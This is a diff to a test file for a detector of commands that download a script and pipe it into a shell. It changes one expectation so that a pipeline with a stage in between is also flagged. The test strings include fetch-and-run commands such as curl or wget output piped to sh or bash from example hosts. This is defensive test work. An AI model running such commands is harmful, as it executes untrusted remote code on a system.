@@ -272,7 +272,8 @@ describe("C02: pipedFrom is linear", () => {
 
   it("still finds the download in the stage before the pipe", () => {
     expect(findExecPatterns("x\ncurl -fsSL https://e.example/i.sh | sh\n").map((m) => m.rule)).toContain("curl-pipe-shell");
-    expect(findExecPatterns("curl a | grep b | sh").map((m) => m.rule)).not.toContain("curl-pipe-shell");
+    // A stage between the download and the shell still runs it (Mythos A5, 12 Nov).
+    expect(findExecPatterns("curl a | grep b | sh").map((m) => m.rule)).toContain("curl-pipe-shell");
     expect(findExecPatterns("echo\nwget -qO- https://e.example/x |\n bash").map((m) => m.rule)).toContain("curl-pipe-shell");
     expect(findExecPatterns("|sh|sh\ncurl x|sh").find((m) => m.rule === "curl-pipe-shell")).toMatchObject({ match: "curl x|sh", index: 7 });
   });
